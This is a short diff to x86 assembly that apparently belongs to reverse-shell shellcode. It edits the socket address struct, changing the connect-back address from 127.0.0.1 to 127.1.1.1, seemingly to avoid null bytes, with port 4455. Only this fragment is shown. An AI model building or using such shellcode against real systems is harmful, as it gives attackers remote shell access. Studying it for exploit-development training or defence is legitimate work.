@@ -51,7 +51,7 @@ dup:
 	
 	; prepare struct
 	xor edx, edx
-	push 0x0100007f		; in_add = 127.0.0.1
+	push 0x0101017f		; in_add = 127.1.1.1
 	push word 0x6711	; port (4455) in network byte order
 	push word 0x2		; AF_INET
 	mov edx, esp		; pointer to struct
